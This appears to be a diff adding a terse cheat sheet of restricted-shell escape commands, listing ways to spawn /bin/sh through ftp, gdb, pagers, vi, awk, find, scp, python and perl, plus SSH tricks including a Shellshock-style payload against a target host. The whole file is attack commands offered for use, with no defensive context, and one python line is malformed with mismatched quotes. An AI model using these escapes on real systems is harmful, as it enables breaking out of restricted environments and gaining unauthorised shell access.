@@ -1,0 +1,23 @@
+Commands that let you execute shell commands
+============================================
+ftp > !/bin/sh
+gdb > !/bin/sh
+more/less/man > !/bin/sh
+vi/vim > :!/bin/sh
+scp -S /tmp/getMeOut.sh x y:
+awk 'BEGIN {system("/bin/sh")}'
+find / -name someName -exec /bin/sh \;
+echo os.system('/bin/sh')
+echo __import__('os').system("/bin/sh")
+
+Maybe SSH can help
+==================
+ssh username@target -t "/bin/sh"
+ssh username@target -t "bash --noprofile"
+ssh username@target -t "() { :; }; /bin/sh"
+
+More advanced techniques
+========================
+echo "Your evil code" | tee script.sh
+python -c 'import os' os.system("/bin/bash")'
+perl -e 'exec "/bin/sh";'
